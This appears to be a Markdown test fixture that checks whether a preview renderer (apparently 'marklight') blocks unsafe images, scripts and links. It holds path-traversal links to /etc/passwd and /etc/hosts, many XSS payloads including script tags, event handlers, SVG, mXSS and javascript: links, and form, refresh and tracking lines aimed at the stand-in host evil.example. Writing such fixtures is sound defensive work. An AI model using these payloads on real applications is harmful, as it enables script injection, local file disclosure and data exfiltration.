# Attack file

## Images that should load

![ok](images/ok.png)
![nested](./images/sub/nested.png)
![symlink inside tree](link-in.png)
![space in name](images/with%20space.png)
![svg with script](images/evil.svg)

## Images that must not load

![parent folder](../assets/shared.png)
![traversal](../../secret/secret.png)
![deep traversal](../../../../../../../../etc/passwd)
![encoded traversal](%2e%2e/%2e%2e/secret/secret.png)
![encoded slash traversal](..%2f..%2fsecret%2fsecret.png)
![absolute path](/etc/hosts)
![file url](file:///etc/hosts)
![symlink out of tree](link-out.png)
![non-image in tree](notes.txt)
![other host](marklight-preview://elsewhere/etc/hosts)
![remote](https://example.com/pixel.png)

## Scripts and active content

<script>window.__pwned = 'script'; document.title = 'pwned-script'</script>

<img alt="onload handler" src="images/ok.png" onload="document.title='pwned-onload'">
<img alt="onerror handler" src="nope.png" onerror="document.title='pwned-onerror'">
<svg><script>document.title='pwned-svg-script'</script></svg>
<svg onload="document.title='pwned-svg-onload'"></svg>
<details open ontoggle="document.title='pwned-ontoggle'"><summary>details</summary></details>
<iframe src="https://example.com/frame"></iframe>
<iframe srcdoc="<script>parent.document.title='pwned-srcdoc'</script>"></iframe>
<object data="https://example.com/object"></object>
<embed src="https://example.com/embed">
<form action="https://evil.example/steal"><input name="q" value="secret"><button id="submit">Go</button></form>
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/track.css">
<style>body { background: url(https://evil.example/track-style-element.png) }</style>
<p style="background:url(https://evil.example/track-style-attr.png)">styled paragraph</p>
<math><mtext><table><mglyph><style><img src=x onerror="document.title='pwned-mxss'"></style></mglyph></table></mtext></math>

<a href="javascript:document.title='pwned-html-js-link'">html js link</a>
<a href="data:text/html,<script>alert(1)</script>">html data link</a>

## Links

[markdown js link](javascript:document.title='pwned-md-js-link')
[attribute breakout](<x" onmouseover="document.title='pwned-attr'" data-x=">)
[external link](https://example.com/page)
<a href="https://example.com/blank" target="_blank">target blank link</a>
[mail link](mailto:someone@example.com)
[other markdown file](other.md)
[anchor link](#links)
